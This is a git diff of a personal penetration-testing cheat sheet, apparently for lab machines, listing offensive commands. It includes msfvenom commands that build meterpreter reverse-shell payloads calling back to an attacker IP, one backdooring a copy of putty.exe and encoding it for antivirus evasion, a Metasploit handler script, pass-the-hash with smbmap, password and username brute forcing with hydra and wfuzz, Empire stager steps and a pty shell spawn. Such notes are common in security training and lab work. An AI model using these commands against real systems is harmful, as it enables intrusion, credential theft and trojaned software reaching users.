@@ -1,37 +1,26 @@
-NMAP
-  Nmap -sC -sV -oA export_path/filename
+Nmap -sC -sV -oA export_path/filename
+  Locate -r nse$ | grep ldap (search Kali for NMAP scripts)
 
-HYDRA (Password Guessing)
-  HYDRA_PROXY_HTTP=http://127.0.0.1:8080 hydra -vV -C /usr/share/seclists/Passwords/Default-Credentials/tomcat-betterdefaultpasslist.txt -s 8080 10.10.10.95 http-get  /manager/html
+HYDRA_PROXY_HTTP=http://127.0.0.1:8080 hydra -vV -C /usr/share/seclists/Passwords/Default-Credentials/tomcat-betterdefaultpasslist.txt -s 8080 10.10.10.95 http-get  /manager/html
   Proxy is used with Burp Suite; -C is pass list username:password; -vV is Verbose
 
-Wfuzz (Brute Force Web Usernames)
-  wfuzz -c -w /usr/share/seclists/Usernames/Names/names.txt -d “username=FUZZ&password=whatever” --hs “No account found with that username.” http://10.10.10.97/login.php
-    -d was received from BurpSuite based on the post data that was sent
-  HTTP Dir Search
-    wfuzz -c -w /usr/share/wfuzz/wordlist/webservices/ws-dirs.txt http://10.10.10.121/FUZZ
-
-Gobuster (Find website directories)
-  gobuster -w /usr/share/wordlists/dirbuster/wordlist.txt -u http://10.10.10.85:3000 -o outputfile.log
-
-Dirb (Find website directories)
-  dirb http://website/
-
 Msfvenom 
-  msfvenom -l formats (list format such as asp, dll, exe, war)
-  msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.17 LPORT=9001 -f war -o filename.war
-    War files are just like zip files used by Tomcat
-  Example
+  Msfvenom -l formats (list format such as asp, dll, exe, war)
+  Msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.17 LPORT=9001 -f war -o filename.war
+  War files are just like zip files used by Tomcat
+    Example
     msfvenom -p windows/meterpreter/reverse_tcp -f exe -e x86/shikata_ga_nai LHOST=192.168.0.30 LPORT=8443 -o /home/scott/my-exploits/compiled/good_one.exe
     msfvenom -p windows/meterpreter/reverse_tcp -f exe -e x86/shikata_ga_nai -i 25 -k -x /root/putty.exe LHOST=192.168.0.14 LPORT=5555 > evilputty.exe  
+    Backdoor EXE
 
-Msfconsole (Run the below script with msfconsole -r meterpreter.rc)
-  vim meterpreter.rc
+Msfconsole
+  Vim meterpreter.rc
      use exploit/multi/handler
      set PAYLOAD windows/meterpreter/reverse_tcp
      set LHOST 192.168.1.184
      set ExitOnSession false
      echo exploit -j -z
+  Run the above script with msfconsole -r meterpreter.rc
 
 Msfdb run (runs Metasploit while starting the database)
   Use exploit/multi/handler
@@ -45,35 +34,57 @@ Silent Trinity (Good C2)
   Python3.7 st.py (starts the program)
   Example https://www.youtube.com/watch?v=PJeBIey8gc4 (at 31:00)
 
+Wfuzz (Brute Force Web Usernames)
+  Wfuzz -c -w /usr/share/seclists/Usernames/Names/names.txt -d “username=FUZZ&password=whatever” --hs “No account found with that username.” http://10.10.10.97/login.php
+  -d was received from BurpSuite based on the post data that was sent
+  HTTP Dir Search
+  wfuzz -c -w /usr/share/wfuzz/wordlist/webservices/ws-dirs.txt http://10.10.10.121/FUZZ
+  
+Gobuster (Find website directories)
+  Gobuster -w /usr/share/wordlists/dirbuster/wordlist.txt -u http://10.10.10.85:3000 -o outputfile.log
+
+Dirb (Find website directories)
+  Dirb http://website/
+
 Test XSS
   <center>test</center>
   If the text is centered and the source contains the html code it is not filtering html code
 
 Smbmap (shows a list of SMB Shares)
-  smbmap -u Username -p Password -H 10.10.10.97
-  smbclient -U ‘username%password’ \\\\10.10.10.97\share
+  Smbmap -u Username -p Password -H 10.10.10.97
+  Smbclient -U ‘username%password’ \\\\10.10.10.97\share
+  Pass the Hash
+  Smbmap -u alice1978 -p ‘NTLM_Hash:NTLM_Hash’ -H 10.10.10.107 
+  -R (-R list contents of shares)
+  --download (download file)
 
 NetCat
-  nc -lvnp port (listener)
+  Listener - nc -lvnp port
 
 Empire 
   https://null-byte.wonderhowto.com/how-to/use-powershell-empire-getting-started-with-post-exploitation-windows-hosts-0178664/
-  listeners (brings you to listeners menu)
-  uselistener [tab] to view listeners to use
-  info to see options to set
-  execute
-  back 
-  usestager [tab] to view stagers (same for modules once you have an agent)
-  info to see options to set
-  set listener [tab] to set listener
+  Listeners (brings you to listeners menu)
+  Uselistener [tab] to view listeners to use
+  Info to see options to set
+  Execute
+  Back 
+  Usestager [tab] to view stagers (same for modules once you have an agent)
+  Info to see options to set
+  Set listener [tab] to set listener
 
 Hashcat (password cracker)
-  hashcat -m 7400 hashfile /opt/wordlists/rockyou
   View hash mode type at (Google Hashcat example hashes)
   Search for the beginning of the hash to determine the mode
+  Hashcat -m 7400 hashfile /opt/wordlists/rockyou
 
 Linux Priv Escalation Enumeration
   https://github.com/rebootuser/LinEnum
+  GTFOBins - list of Unix binaries that can be exploited by an attacker to bypass local security restrictions.
+  https://gtfobins.github.io/
 
 Python Bash Shell
-  python -c ‘import pty;pty.spawn(“/bin/bash”)’
+  Python -c ‘import pty;pty.spawn(“/bin/bash”)’
+
+Phamton Evasion
+Veil
+Empire
